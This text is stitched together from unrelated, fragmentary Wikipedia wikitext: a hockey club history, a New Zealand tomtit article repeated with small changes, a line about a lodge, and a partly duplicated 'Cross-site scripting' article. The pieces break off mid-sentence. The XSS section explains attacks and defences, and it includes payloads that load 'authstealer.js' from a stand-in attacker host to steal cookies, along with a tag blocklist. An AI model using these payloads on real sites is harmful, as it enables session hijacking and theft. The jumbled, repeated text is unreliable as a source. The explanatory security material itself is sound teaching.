They played in the [[Western Ontario Athletic Association Senior Hockey League]].\n\n==History==\nArthur has had numerous hockey teams nicknamed the Tigers since 1904, with the most recent team playing in the WOAA from 1985 to 1999.  The team folded at the conclusion of the 1998\u201399 season.  Along with the 1991 Grand Championship, the Tigers were also WOAA Intermediate B champions in 1989 and 1990.\n\nSome stars over the years included: Ken Riley, Al Bell, Garnett Rooney, Bob McCulloch, Bryan Richardson, Paul Epoch, Scott McCulloch, Tom O'Donnell, Marty Groulx, Bruce Richardson, Ray Hutchison, Mike Brooks, Glenn Watt, Darryl Rooney.\n\nSome of the \"Honorary Tigers\" include: Bert Coffey, John Walsh, Clive Williams, Bill Smellie, Norbert Heffernan.\n\nThe club held Reunions in 1993 and again in 1998. These events attracted some 250\u2013300 former players, coaches and friends of the Tigers.\n\n===1991 Grand Championship===\nThe club had their most successful season in 1990-91 season, defeating the heavily favoured [[Durham Thundercats]] to become the WOAA Grand Champions. The Tigers captured the WOAA Senior B Championship eliminating Wiarton and Drayton. Posting a 9-1 post-season record, the Tigers issued a challenge to the Senior A champion [[Durham Thundercats]] for a Grand Championship series.  Many of the players of the Thundercats had left on vacation at the end of the Senior A series, not expecting a Grand Championship, and had to return from Jamaica to play. The series went a full five games. Durham won game 1 10-2. Arthur won game two 10-1. Game three in Durham saw the T-Cats edge the Tigers 5-4. Coming back to Arthur, the Tigers needed to win to force a fifth and deciding game. Game four in Arthur, on a Sunday evening, was canceled at game time, with the fans already in the Arena, due to a compressor break down. Rescheduled to the following Tuesday evening, Arthur won 8-3 to force the fifth and deciding game. In Durham on Friday, April 3, 1991, a full house turned out. Tied heading into the 3rd period 3-3, the Tigers pulled ahead 6-3. Things appeared well in hand for Arthur. Tenacious Durham winger Scott Betts had other things in mind scoring two goals in the final two minutes to bring the homeside within a goal. Arthur held on for the 6-5 victory. Tigers winger John McCabe led all WOAA playoff scorers with 28 points. Netminder Marty Groulx sparkled for Arthur. Other players included: Scott McCulloch, Tom O'Donnell, Ray Hutchison, Eck Palmer Jr., Brian Ward, Jim \"The Champ\" Holmes, Paul Epoch, Fred Locking, Matt Coffey, John Bell, Don Jackson, Doug Bell, Rob McCulloch, Mike Raftis, Grant Rundle, Brad Smith, Frank Goetz, Jeff Bauman, Mark Goetz III, Walt Lesenke Jr. Coach Don Tremble, Assistant Coach Cal MacDonald, Manager/President Jeff McKee, Trainer Walt Lesenke Sr.\n\nOther highly successful seasons included: 1971 - WOAA Grand Championship Finalists, 1952 Pritchard Trophy Champions and 1938 OHA Division Champions.\n\n===The road team===\nIn 1977 the Arthur Tigers were a men's hockey club without an arena. Winning was not the highlight of the season, rather the fact that they played all their games on the road was. It was at about this time that the Tigers folded until a rebirth in the fall of 1984. They competed for one season in the OHA before rejoining the WOAA. Pete O'Donnell was the team's captain and Steve Baker was named the club's Most Valuable Player.\n\n==Rivalries==\nThe Tigers had a big rivalry with the [[Drayton Icemen|Drayton Comets]], through the late 1980s and early 1990s. The two towns are located 30 kilometers apart, and the clubs met four times in the playoffs - 1989, 1990, 1991 and 1992. Each club won two series. In 1990 Drayton defeated the Tigers to advance to the WOAA Grand Championship Final. In 1991, Arthur defeated Drayton en route to the WOAA Grand Championship.\n\nThrough the 1950s, 1960s and 1970s strong rivalries were formed with Harriston, Palmerston, Mt. Forest and Milverton.\n\nOne of the most famous games was played in the mid-1950s in Arthur. A packed house became embroiled in brawl which spilled out onto the ice. Fans leaned against the boards when defenceman Ken Elliott became involved in a fight. The boards slipped off their hooks, and the fans spilled onto the ice, resulting in the melee. Mt.

It is [[endemic (ecology)|endemic]] to the islands of [[New Zealand]], ranging across the main islands as well as several of the [[New Zealand outlying islands|outlying islands]]. It has several other [[Maori language|Maori]] and [[English language|English]] names. There are several [[subspecies]] showing considerable variation in [[plumage]] and size. The species is not threatened and has adapted to the changes made to New Zealand's [[Biodiversity of New Zealand|biodiversity]].\n\n==Etymology==\nThe term ''tomtit'' was originally a shortened form of ''tom titmouse''.<ref>[https://www.rspb.org.uk/birds-and-wildlife/bird-and-wildlife-guides/ask-an-expert/previous/tomtit.aspx Royal Society For The Protection of Birds: ''What kind of bird is known as a 'tom tit'?'']</ref> Either form has been used to describe a number of small birds, but in England ''tomtit'' was most commonly used as an alternate name of the [[blue tit]]. The word [[Tit (bird)|tit]] is today used for a number of small birds, especially of the family Paridae. Originally, it was used for any small animal or object.<ref>[http://www.etymonline.com/index.php?term=tit ''Tit''. Etymology Online]</ref>\n\n==Taxonomy and evolution==\nThe tomtit is one of four species of the [[genus]] ''[[Petroica]]'' found in New Zealand, the ancestors of which colonised from [[Australia]]. The species was once thought to have been descended from the [[scarlet robin]],<ref>C.A. Fleming, (1950) New Zealand flycatchers of the genus ''Petroica Swainson'' (Aves), Parts I and II, ''Trans. Roy. Soc. NZ'' '''78''', pp. 14\u201347 126\u2013160.</ref> although more recent research has questioned this. It seems likely that there were two colonisation events, with the North Island robin and the South Island robin descended from one event, and the [[black robin]] and tomtit from another.<ref name = \"Miller\">Miller, Hilary C. & Lambert, David M.

Four of these five subspecies have been elevated to full species in the past (the Chatham subspecies was retained with the South Island tomtit),<ref>R.N. Holdaway, T.H. Worthy and A.J.D.

It is [[endemic (ecology)|endemic]] to the islands of [[New Zealand]], ranging across the main islands as well as several of the [[New Zealand outlying islands|outlying islands]]. It has several other [[Maori language|Maori]] and [[English language|English]] names. There are several [[subspecies]] showing considerable variation in [[plumage]] and size. The species is not threatened and has adapted to the changes made to New Zealand's [[Biodiversity of New Zealand|biodiversity]].\n\n==Etymology==\nThe term ''tomtit'' was originally a shortened form of ''tom titmouse''.<ref>[https://www.rspb.org.uk/birds-and-wildlife/bird-and-wildlife-guides/ask-an-expert/previous/tomtit.aspx Royal Society For The Protection of Birds: ''What kind of bird is known as a 'tom tit'?'']</ref> Either form has been used to describe a number of small birds, but in England ''tomtit'' was most commonly used as an alternate name of the [[blue tit]]. The word [[Tit (bird)|tit]] is today used for a number of small birds, especially of the family Paridae. Originally, it was used for any small animal or object.<ref>[http://www.etymonline.com/index.php?term=tit ''Tit''. Etymology Online]</ref>\n\n==Taxonomy and evolution==\nThe tomtit is one of four species of the [[genus]] ''[[Petroica]]'' found in New Zealand, the ancestors of which having colonised from [[Australia]]. The species was once thought to have been descended from the [[scarlet robin]],<ref>C.A. Fleming, (1950) New Zealand flycatchers of the genus ''Petroica Swainson'' (Aves), Parts I and II, ''Trans. Roy. Soc. NZ'' '''78''', pp. 14\u201347 126\u2013160.</ref> although more recent research has questioned this. It seems likely that there were two colonisation events, with the North Island robin and the South Island robin descended from one event and the [[black robin]] and tomtit from another.<ref name = \"Miller\">Miller, Hilary C. & Lambert, David M.

''Molecular Phylogenetics and Evolution'' '''40'''(3): 844-855.</ref>\n\nThere are five subspecies of the tomtit, each subspecies being restricted to each of the following islands or island groups, North Island, South Island, the Snares Islands, the Chatham Islands and the Auckland Islands. Four of these five subspecies have been elevated to full species in the past (the Chatham subspecies was retained with the South Island tomtit),<ref>R.N. Holdaway, T.H. Worthy and A.J.D.

The Dragon Hill Lodge, or DHL for short, was completed in 1990.  In subsequent years, an addition to the DHL created more guest rooms and The Point fitness center.

{"title_page": "Cross-site scripting", "text_new": "{{Redirect|XSS}}\n{{short description|Computer security vulnerability}}\n{{Use mdy dates|date=June 2018}}\n'''Cross-site scripting''' ('''XSS''') is a type of computer security [[vulnerability (computer science)|vulnerability]] typically found in [[web application]]s. XSS attacks enable attackers to [[code injection|inject]] [[client-side script]]s into [[web page]]s viewed by other users. A cross-site scripting vulnerability may be used by attackers to bypass [[access control]]s such as the [[same-origin policy]]. Cross-site scripting carried out on [[website]]s accounted for roughly 84% of all security vulnerabilities documented by [[NortonLifeLock|Symantec]] up until 2007.<ref name=\"Symantec-2007-2nd-exec\">During the second half of 2007, 11,253 site-specific cross-site vulnerabilities were documented by XSSed, compared to 2,134 \"traditional\" vulnerabilities documented by Symantec, in {{cite journal |title=Symantec Internet Security Threat Report: Trends for July\u2013December 2007 (Executive Summary) |publisher=Symantec Corp. |volume=XIII |pages=1\u20133 |date=April 2008 |url=http://eval.symantec.com/mktginfo/enterprise/white_papers/b-whitepaper_exec_summary_internet_security_threat_report_xiii_04-2008.en-us.pdf |accessdate=May 11, 2008 }}</ref> In 2017, XSS attacks were still considered a major threat vector.<ref>{{cite web|url=http://www.zdnet.com/article/at-30000-for-a-flaw-bug-bounties-are-big-and-getting-bigger/|title=At $30,000 for a flaw, bug bounties are big and getting bigger - ZDNet|first=Steve|last=Ranger|publisher=}}</ref> XSS effects vary in \nrange from petty nuisance to significant security risk, depending on the sensitivity of the data handled by the vulnerable site and the nature of any security mitigation implemented by the site's owner [[Computer network|network]].\n\n==Background==\nSecurity on the web depends on a variety of mechanisms, including an underlying concept of trust known as the same-origin policy. This essentially states that if content from one site (such as ''<nowiki>https://mybank.example1.com</nowiki>'') is granted permission to access resources (like cookies etc.) on a [[web browser]], then content from any URL with the same (1) URI scheme, (2) host name, ''and'' (3) port number will share these permissions. Content from URLs where any of these three attributes are different will have to be granted permissions separately.<ref>{{cite web |title= Same Origin Policy - Web Security. W3.org. |url= http://www.w3.org/Security/wiki/Same_Origin_Policy |accessdate= November 4, 2014 }}</ref>\n\nCross-site scripting attacks use known vulnerabilities in web-based applications, their servers, or the plug-in systems on which they rely. Exploiting one of these, attackers fold malicious content into the content being delivered from the compromised site. When the resulting combined content arrives at the client-side web browser, it has all been delivered from the trusted source, and thus operates under the permissions granted to that system. By finding ways of injecting malicious scripts into web pages, an attacker can gain elevated access-privileges to sensitive page content, to session cookies, and to a variety of other information maintained by the browser on behalf of the user. Cross-site scripting attacks are a case of [[code injection]].\n\n[[Microsoft]] security-engineers introduced the term \"cross-site scripting\" in January 2000.<ref name=\"xssname\">{{cite web |author= \"dross\" on MSDN |title= Happy 10th birthday Cross-Site Scripting! |url= http://blogs.msdn.com/b/dross/archive/2009/12/15/happy-10th-birthday-cross-site-scripting.aspx |date=15 Dec 2009 |accessdate= 2016-03-19 | quote = On the 16th of January, 2000, the following names were suggested and bounced around among a small group of Microsoft security engineers: [...] The next day there was consensus \u2013 Cross Site Scripting. }}</ref> The expression \"cross-site scripting\" originally referred to the act of loading the attacked, third-party web application from an unrelated attack-site, in a manner that executes a fragment of [[JavaScript]] prepared by the attacker in the [[same-origin policy|security context]] of the targeted domain (taking advantage of a ''reflected'' or ''non-persistent'' XSS vulnerability). The definition gradually expanded to encompass other modes of code injection, including persistent and non-JavaScript vectors (including [[ActiveX]], [[Java (programming language)|Java]], [[VBScript]], [[Adobe Flash|Flash]], or even [[HTML]] scripts), causing some confusion to newcomers to the field of [[information security]].<ref name=\"Grossman\">{{cite web |last= Grossman |first= Jeremiah |title= The origins of Cross-Site Scripting (XSS) |url= http://jeremiahgrossman.blogspot.com/2006/07/origins-of-cross-site-scripting-xss.html |date= July 30, 2006 |accessdate= September 15, 2008 }}</ref>\n\nXSS vulnerabilities have been reported and exploited since the 1990s.

The bait is an innocent-looking URL, pointing to a trusted site but containing the XSS vector. If the trusted site is vulnerable to the vector, clicking the link can cause the victim's browser to execute the injected script.\n\n===Persistent (or stored)===\n{{Quote box\n| width = 30%\n| title = Example of a persistent XSS flaw\n| quote = A persistent [[cross-zone scripting]] vulnerability coupled with a [[computer worm]] allowed execution of arbitrary code and listing of filesystem contents via a QuickTime movie on [[MySpace]].<ref>This worm is named JS/Ofigel-A, JS/Quickspace.A and JS.Qspace, in {{cite web |title=JS/Ofigel-A |url=http://www.sophos.com/security/analyses/viruses-and-spyware/jsofigela.html |archive-url=https://web.archive.org/web/20090802232707/http://www.sophos.com/security/analyses/viruses-and-spyware/jsofigela.html |url-status=dead |archive-date=August 2, 2009 |publisher=Sophos |accessdate=June 5, 2008}}  and {{cite web |title=F-Secure Malware Information Pages: JS/Quickspace.A |url=http://www.f-secure.com/v-descs/js_quickspace_a.shtml |date=January 5, 2007 |publisher=F-Secure |accessdate=June 5, 2008}} and {{cite web |title=JS.Qspace |url=http://www.symantec.com/security_response/writeup.jsp?docid=2006-120313-2523-99 |date=February 13, 2007 |publisher=Symantec Corp. |accessdate=June 5, 2008}}</ref>|\n}}\n\nThe ''persistent'' (or ''stored'') XSS vulnerability is a more devastating variant of a cross-site scripting flaw: it occurs when the data provided by the attacker is saved by the server, and then permanently displayed on \"normal\" pages returned to other users in the course of regular browsing, without proper HTML escaping. A classic example of this is with online message boards where users are allowed to post HTML formatted messages for other users to read.<ref name=\"WASC-2005\" />\n\nFor example, suppose there is a dating website where members scan the profiles of other members to see if they look interesting.  For privacy reasons, this site hides everybody's real name and email.  These are kept secret on the server.  The only time a member's real name and [[email]] are in the browser is when the member is [[Login|signed in]], and they can't see anyone else's.\n\nSuppose that Mallory, an attacker, joins the site and wants to figure out the real names of the people she sees on the site.  To do so, she writes a script designed to run from other users' browsers when ''they'' visit ''her'' profile.  The script then sends a quick message to her own server, which collects this information.\n\nTo do this, for the question \"Describe your Ideal First Date\", Mallory gives a short answer (to appear normal) but the text at the end of her answer is her script to steal names and emails.  If the script is enclosed inside a <code><script></code> element, it won't be shown on the screen.  Then suppose that Bob, a member of the dating site, reaches Mallory's profile, which has her answer to the First Date question. Her script is run automatically by the browser and steals a copy of Bob's real name and email directly from his own machine.\n\nPersistent XSS vulnerabilities can be more significant than other types because an attacker's malicious script is rendered automatically, without the need to individually target victims or lure them to a third-party website. Particularly in the case of social networking sites, the code would be further designed to self-propagate across accounts, creating a type of client-side [[Computer worm|worm]].<ref>Viruses and worms in {{cite web |last=Alcorn |first=Wade |title=The Cross-site Scripting Virus |date=September 27, 2005 |url=http://www.bindshell.net/papers/xssv |publisher=BindShell.net |accessdate=May 27, 2008 |archive-url=https://web.archive.org/web/20080516055612/http://www.bindshell.net/papers/xssv/ |archive-date=May 16, 2008 |url-status=dead |df=mdy-all }} and {{cite web |last=Grossman |first=Jeremiah |title=Cross-Site Scripting Worms and Viruses: The Impending Threat and the Best Defense |url=http://www.net-security.org/dl/articles/WHXSSThreats.pdf |date=April 2006 |publisher=WhiteHat Security |page=20 |accessdate=June 6, 2008 }}{{Dead link|date=August 2018 |bot=InternetArchiveBot |fix-attempted=yes }}</ref>\n\nThe methods of injection can vary a great deal; in some cases, the attacker may not even need to directly interact with the web functionality itself to exploit such a hole. Any data received by the web application (via email, system logs, IM etc.) that can be controlled by an attacker could become an injection vector.\n\n===Server-side versus DOM-based vulnerabilities===\n{{Quote box\n|width=30%\n|title=Example of a DOM-based XSS flaw\n|Before the bug was resolved, Bugzilla error pages were open to [[Document Object Model|DOM]]-based XSS attacks in which arbitrary HTML and scripts could be injected using forced error messages.<ref>{{cite web |title=Bug 272620 \u2013 XSS vulnerability in internal error messages |url=https://bugzilla.mozilla.org/show_bug.cgi?id=272620 |year=2004 |publisher=Bugzilla@Mozilla |accessdate=May 29, 2008}}</ref>\n}}\nHistorically XSS vulnerabilities were first found in applications that performed all data processing on the server side. User input (including an XSS vector) would be sent to the server, and then sent back to the user as a web page. The need for an improved user experience resulted in popularity of applications that had a majority of the presentation logic (maybe written in [[JavaScript]]) working on the client-side that pulled data, on-demand, from the server using [[AJAX]].\n\nAs the JavaScript code was also processing user input and rendering it in the web page content, a new sub-class of reflected XSS attacks started to appear that was called ''[[Document Object Model|DOM]]-based cross-site scripting''. In a DOM-based XSS attack, the malicious data does not touch the web server. Rather, it is being reflected by the JavaScript code, fully on the client side.<ref>{{cite web |url=https://www.owasp.org/index.php/DOM_Based_XSS |title=DOM based XSS |publisher=OWASP}}</ref>\n\nAn example of a DOM-based XSS vulnerability is the bug found in 2011 in a number of [[jQuery]] plugins.<ref>{{cite web |url=http://bugs.jquery.com/ticket/9521 |title=JQuery bug #9521 |year=2011}}</ref> Prevention strategies for DOM-based XSS attacks include very similar measures to traditional XSS prevention strategies but implemented in [[JavaScript]] code and contained in web pages (i.e. input validation and escaping).<ref>{{cite web |url=https://www.owasp.org/index.php/DOM_based_XSS_Prevention_Cheat_Sheet |title=DOM based XSS prevention cheat sheet |publisher=OWASP}}</ref> Some [[JavaScript library|JavaScript frameworks]] have built-in countermeasures against this and other types of attack &mdash; for example [[Angular.js]].<ref>{{cite web |url=http://docs.angularjs.org/api/ng.$sce |title=Strict Contextual Escaping |publisher=Angular.js}}</ref>\n\n===Self-XSS===\n\n[[Self-XSS]] is a form of XSS vulnerability which relies on Social Engineering in order to trick the victim into executing malicious JavaScript code into their browser. Although it is technically not a true XSS vulnerability due to the fact it relies on socially engineering a user into executing code rather than a flaw in the affected website allowing an attacker to do so, it still poses the same risks as a regular XSS vulnerability if properly executed.<ref>{{cite web |title= Self-XSS Facebook scam attempts to trick users into hacking themselves |work= www.majorgeeks.com |date= 2014-07-29 |url= http://www.majorgeeks.com/news/story/self_xss_facebook_scam_attempts_to_trick_users_into_hacking_themselves.html |access-date= 2016-09-20 }}</ref>\n\n===Mutated XSS (mXSS) ===\nMutated XSS happens when the attacker injects something that is seemingly safe, but rewritten and modified by the browser, while parsing the markup. This makes it extremely hard to detect or sanitize within the websites application logic.\nAn example is rebalancing unclosed quotation marks or even adding quotation marks to unquoted parameters on parameters to CSS font-family.\n\n=={{anchor|Exploit scenarios}}Exploit examples==\n\nAttackers intending to exploit cross-site scripting vulnerabilities must approach each class of vulnerability differently. For each class, a specific attack vector is described here. The names below are technical terms, taken from the [[Alice and Bob|Alice-and-Bob cast of characters]] commonly used in computer security.\n\nThe [[BeEF (Browser Exploitation Framework)|Browser Exploitation Framework]] could be used to attack the web site and the user's local environment.\n\n===Non-persistent===\n# Alice often visits a particular website, which is hosted by Bob. Bob's website allows Alice to log in with a username/password pair and stores sensitive data, such as billing information. When a user logs in, the browser keeps an Authorization Cookie, which looks like some garbage characters, so both computers (client and server) have a record that she's logged in.\n# Mallory observes that Bob's website contains a reflected XSS vulnerability:\n## When she visits the Search page, she inputs a search term in the search box and clicks the submit button. If no results were found, the page will display the term she searched for followed by the words \"not found,\" and the url will be <code><nowiki>http://bobssite.org/search?q=her</nowiki>%20search%20term</code>.\n## With a normal search query, like the word \"'''puppies'''\", the page simply displays \"'''puppies''' not found\" and the url is \"<nowiki>http://bobssite.org/search</nowiki>'''?q=puppies'''\" - which is perfectly normal behavior.\n## However, when she submits an abnormal search query, like \"{{code|2=html4strict|1=<script type='application/javascript'>alert('xss');</script>}}\",\n### An alert box appears (that says \"xss\").\n### The page displays \" not found,\" along with an error message with the text 'xss'.\n### The url is \"<code><nowiki>http://bobssite.org/search</nowiki>'''?q=<script%20type='application/javascript'>alert('xss');</script>'''</code> - which is exploitable behavior.\n# Mallory crafts a URL to exploit the vulnerability:\n## She makes the URL <code><nowiki>http://bobssite.org/search</nowiki>'''?q=puppies&lt;script%20src=\"<nowiki>http://mallorysevilsite.com/authstealer.js\"></script></nowiki>'''</code>. She could choose to encode the [[ASCII]] characters with [[percent-encoding]], such as <code><nowiki>http://bobssite.org/search</nowiki>'''?q=puppies<nowiki>%3Cscript%2520src%3D%22http%3A%2F%2Fmallorysevilsite.com%2Fauthstealer.js%22%3E%3C%2Fscript%3E</nowiki>'''</code>, so that human readers cannot immediately decipher the malicious URL.<ref name=geekstuff>{{cite web |url=http://www.thegeekstuff.com/2012/02/xss-attack-examples/ |title=XSS Attack Examples (Cross-Site Scripting Attacks) |author=Lakshmanan Ganapathy |date=February 16, 2012 |website=www.thegeekstuff.com}}</ref>\n## She sends an e-mail to some unsuspecting members of Bob's site, saying \"Check out some cute puppies!\"\n# Alice gets the e-mail. She loves puppies and clicks on the link. It goes to Bob's website to search, doesn't find anything, and displays \"puppies not found\" but right in the middle, the script tag runs (it is invisible on the screen) and loads and runs Mallory's program authstealer.js (triggering the XSS attack). Alice forgets about it.\n# The authstealer.js program runs in Alice's browser, as if it originated from Bob's website. It grabs a copy of Alice's Authorization Cookie and sends it to Mallory's server, where Mallory retrieves it.\n# Mallory now puts Alice's Authorization Cookie into her browser as if it were her own. She then goes to Bob's site and is now logged in as Alice.\n# Now that she's in, Mallory goes to the Billing section of the website and looks up Alice's [[Payment card number|credit card number]] and grabs a copy. Then she goes and changes her password so Alice can't log in anymore.\n# She decides to take it a step further and sends a similarly crafted link to Bob himself, thus gaining administrator privileges to Bob's website.\n\nSeveral things could have been done to mitigate this attack:\n# The search input could have been [[HTML sanitization|sanitized]] which would include proper encoding checking.\n# The web server could be set to [[Server-side redirect|redirect]] invalid requests.\n# The web server could detect a simultaneous login and invalidate the sessions.\n# The web server could detect a simultaneous login from two different IP addresses and invalidate the sessions.\n# The website could display only the last few digits of a previously used credit card.\n# The website could require users to enter their passwords again before changing their registration information.\n# The website could enact various aspects of the [[Content Security Policy]].\n# Set cookie with <code>HttpOnly</code> flag to prevent access from JavaScript.\n\n===Persistent attack===\n# Mallory gets an account on Bob's website.\n# Mallory observes that Bob's website contains a stored XSS vulnerability. If you go to the News section, and post a comment, it will display whatever he types in for the comment. But, if the comment text contains HTML tags in it, the tags will be displayed as it is, and any script tags get run.\n# Mallory reads an article in the News section and writes in a comment at the bottom in the Comments section. In the comment, she inserts this text: <code>I love the puppies in this story! They're so cute!'''&lt;script src=\"<nowiki>http://mallorysevilsite.com/authstealer.js</nowiki>\"&gt;'''</code>\n# When Alice (or anyone else) loads the page with the comment, Mallory's script tag runs and steals Alice's authorization cookie, sending it to Mallory's secret server for collection.<ref name=geekstuff/>\n# Mallory can now [[session hijacking|hijack]] Alice's session and impersonate Alice.<ref>{{cite news |last=Brodkin |first=Jon |title=The top 10 reasons Web sites get hacked |url=http://www.networkworld.com/article/2286560/lan-wan/the-top-10-reasons-web-sites-get-hacked.html |date=October 4, 2007 |work=Network World |publisher=IDG |accessdate=February 6, 2017 }}</ref><ref name=geekstuff/>\n\nBob's website software should have stripped out the script tag or done something to make sure it didn't work, but the security bug is in the fact that he didn't.\n\n=={{anchor|Mitigation|Reducing the threat}}Preventive measures==\n{{manual|section|date=December 2014}}\n\n===Contextual output encoding/escaping of string input===\n\nContextual output encoding/escaping could be used as the primary defense mechanism to stop XSS attacks. There are several escaping schemes that can be used depending on where the untrusted string needs to be placed within an HTML document including HTML entity encoding, JavaScript escaping, CSS escaping, and [[Percent-encoding|URL (or percent) encoding]].<ref name=\"OWASP\">{{cite web |last=Williams |first=Jeff |title=XSS (Cross Site Scripting) Prevention Cheat Sheet |url=https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet |publisher=OWASP |date=January 19, 2009 |accessdate=February 4, 2010 }}</ref> Most web applications that do not need to accept rich data can use escaping to largely eliminate the risk of XSS attacks in a fairly straightforward manner.\n\nAlthough widely recommended, performing HTML entity encoding only on the [[List of XML and HTML character entity references#Predefined entities in XML|five XML significant characters]] is not always sufficient to prevent many forms of XSS attacks. As encoding is often difficult, security encoding libraries are usually easier to use.<ref name=\"OWASP\" />\n\nSome [[web template system]]s understand the structure of the HTML they produces and automatically pick an appropriate encoder.<ref>{{Cite web|url=https://golang.org/pkg/html/template/#hdr-Introduction|title=template - The Go Programming Language|website=golang.org|access-date=2019-05-01}}</ref><ref>{{Cite web|url=https://developers.google.com/closure/templates/docs/security|title=Google Developers|website=Google Developers|language=en|access-date=2019-05-01}}</ref><ref>{{Cite web|url=https://www.npmjs.com/package/pug-plugin-trusted-types|title=pug-plugin-trusted-types|website=npm|access-date=2019-05-01}}</ref>\n\n===Safely validating untrusted HTML input ===\n\nMany operators of particular web applications (e.g. forums and webmail) allow users to utilize a limited subset of HTML markup. When accepting HTML input from users (say, <tt>&lt;b&gt;very&lt;/b&gt; large</tt>), output encoding (such as <tt>&amp;lt;b&amp;gt;very&amp;lt;/b&amp;gt; large</tt>) will not suffice since the user input needs to be rendered as HTML by the browser (so it shows as \"'''very''' large\", instead of \"&lt;b&gt;very&lt;/b&gt; large\"). Stopping an XSS attack when accepting HTML input from users is much more complex in this situation. Untrusted HTML input must be run through an [[HTML sanitization]] engine to ensure that it does not contain XSS code.\n\nMany validations rely on parsing out (blacklisting) specific \"at risk\" HTML tags such as the following<syntaxhighlight lang=\"html5\">\n<script> <link> <iframe>\n</syntaxhighlight>\n\nThere are several issues with this approach, for example sometimes seemingly harmless tags can be left out which when utilized correctly can still result in an XSS\n\n(see the below example) <syntaxhighlight lang=\"html5\">\n<img src=\"javascript:alert(1)\">\n</syntaxhighlight>Another popular method is to strip user input of \" and ' however this can also be bypassed as the payload can be concealed with [[Obfuscation]] (See this [http://www.jsfuck.com/] link for an extreme example of this)\n\n===Cookie security===\nBesides content filtering, other imperfect methods for cross-site scripting mitigation are also commonly used. One example is the use of additional security controls when handling [[HTTP cookie|cookie]]-based user authentication. Many web applications rely on session cookies for authentication between individual HTTP requests, and because client-side scripts generally have access to these cookies, simple XSS exploits can steal these cookies.<ref name=\"Sharma\">{{cite web |last=Sharma |first=Anand |title=Prevent a cross-site scripting attack |url=http://www.ibm.com/developerworks/ibm/library/wa-secxss/ |publisher=IBM |date=February 3, 2004 |accessdate=May 29, 2008 }}</ref> To mitigate this particular threat (though not the XSS problem in general), many web applications tie session cookies to the IP address of the user who originally logged in, then only permit that IP to use that cookie.<ref name=\"ModSecurity\">{{cite web |title=ModSecurity: Features: PDF Universal XSS Protection |url=http://www.modsecurity.org/projects/modsecurity/apache/feature_universal_pdf_xss.html |archive-url=https://web.archive.org/web/20080323040609/http://www.modsecurity.org/projects/modsecurity/apache/feature_universal_pdf_xss.html |url-status=dead |archive-date=March 23, 2008 |publisher=Breach Security |accessdate=June 6, 2008 }}</ref> This is effective in most situations (if an attacker is only after the cookie), but obviously breaks down in situations where an attacker is behind the same [[Network address translation|NAT]]ed IP address or [[web proxy]] as the victim, or the victim is changing his or her [[mobile IP]].<ref name=\"ModSecurity\" />\n\nAnother mitigation present in [[Internet Explorer]] (since version 6), [[Firefox]] (since version 2.0.0.5), [[Safari (web browser)|Safari]] (since version 4), [[Opera (web browser)|Opera]] (since version 9.5) and [[Google Chrome]], is an ''HttpOnly'' flag which allows a web server to set a cookie that is unavailable to client-side scripts.

In this way, even potentially malicious client-side scripts could be inserted unescaped on a page, and users would not be susceptible to XSS attacks.\n\nSome browsers or browser plugins can be configured to disable client-side scripts on a per-domain basis.

XSS attacks enable attackers to [[code injection|inject]] [[client-side script]]s into [[web page]]s viewed by other users. A cross-site scripting vulnerability may be used by attackers to bypass [[access control]]s such as the [[same-origin policy]].

This essentially states that if content from one site (such as ''<nowiki>https://mybank.example1.com</nowiki>'') is granted permission to access resources (like cookies etc.) on a [[web browser]], then content from any URL with the same (1) URI scheme, (2) host name, ''and'' (3) port number will share these permissions. Content from URLs where any of these three attributes are different will have to be granted permissions separately.<ref>{{cite web |title= Same Origin Policy - Web Security. W3.org. |url= http://www.w3.org/Security/wiki/Same_Origin_Policy |accessdate= November 4, 2014 }}</ref>\n\nCross-site scripting attacks use known vulnerabilities in web-based applications, their servers, or the plug-in systems on which they rely. Exploiting one of these, attackers fold malicious content into the content being delivered from the compromised site. When the resulting combined content arrives at the client-side web browser, it has all been delivered from the trusted source, and thus operates under the permissions granted to that system. By finding ways of injecting malicious scripts into web pages, an attacker can gain elevated access-privileges to sensitive page content, to session cookies, and to a variety of other information maintained by the browser on behalf of the user. Cross-site scripting attacks are a case of [[code injection]].\n\n[[Microsoft]] security-engineers introduced the term \"cross-site scripting\" in January 2000.<ref name=\"xssname\">{{cite web |author= \"dross\" on MSDN |title= Happy 10th birthday Cross-Site Scripting! |url= http://blogs.msdn.com/b/dross/archive/2009/12/15/happy-10th-birthday-cross-site-scripting.aspx |date=15 Dec 2009 |accessdate= 2016-03-19 | quote = On the 16th of January, 2000, the following names were suggested and bounced around among a small group of Microsoft security engineers: [...] The next day there was consensus \u2013 Cross Site Scripting. }}</ref> The expression \"cross-site scripting\" originally referred to the act of loading the attacked, third-party web application from an unrelated attack-site, in a manner that executes a fragment of [[JavaScript]] prepared by the attacker in the [[same-origin policy|security context]] of the targeted domain (taking advantage of a ''reflected'' or ''non-persistent'' XSS vulnerability). The definition gradually expanded to encompass other modes of code injection, including persistent and non-JavaScript vectors (including [[ActiveX]], [[Java (programming language)|Java]], [[VBScript]], [[Adobe Flash|Flash]], or even [[HTML]] scripts), causing some confusion to newcomers to the field of [[information security]].<ref name=\"Grossman\">{{cite web |last= Grossman |first= Jeremiah |title= The origins of Cross-Site Scripting (XSS) |url= http://jeremiahgrossman.blogspot.com/2006/07/origins-of-cross-site-scripting-xss.html |date= July 30, 2006 |accessdate= September 15, 2008 }}</ref>\n\nXSS vulnerabilities have been reported and exploited since the 1990s.

A classic example of this is with online message boards where users are allowed to post HTML formatted messages for other users to read.<ref name=\"WASC-2005\" />\n\nFor example, suppose there is a dating website where members scan the profiles of other members to see if they look interesting.  For privacy reasons, this site hides everybody's real name and email.  These are kept secret on the server.  The only time a member's real name and [[email]] are in the browser is when the member is [[Login|signed in]], and they can't see anyone else's.\n\nSuppose that Mallory, an attacker, joins the site and wants to figure out the real names of the people she sees on the site.  To do so, she writes a script designed to run from other users' browsers when ''they'' visit ''her'' profile.  The script then sends a quick message to her own server, which collects this information.\n\nTo do this, for the question \"Describe your Ideal First Date\", Mallory gives a short answer (to appear normal) but the text at the end of her answer is her script to steal names and emails.  If the script is enclosed inside a <code><script></code> element, it won't be shown on the screen.  Then suppose that Bob, a member of the dating site, reaches Mallory's profile, which has her answer to the First Date question. Her script is run automatically by the browser and steals a copy of Bob's real name and email directly from his own machine.\n\nPersistent XSS vulnerabilities can be more significant than other types because an attacker's malicious script is rendered automatically, without the need to individually target victims or lure them to a third-party website. Particularly in the case of social networking sites, the code would be further designed to self-propagate across accounts, creating a type of client-side [[Computer worm|worm]].<ref>Viruses and worms in {{cite web |last=Alcorn |first=Wade |title=The Cross-site Scripting Virus |date=September 27, 2005 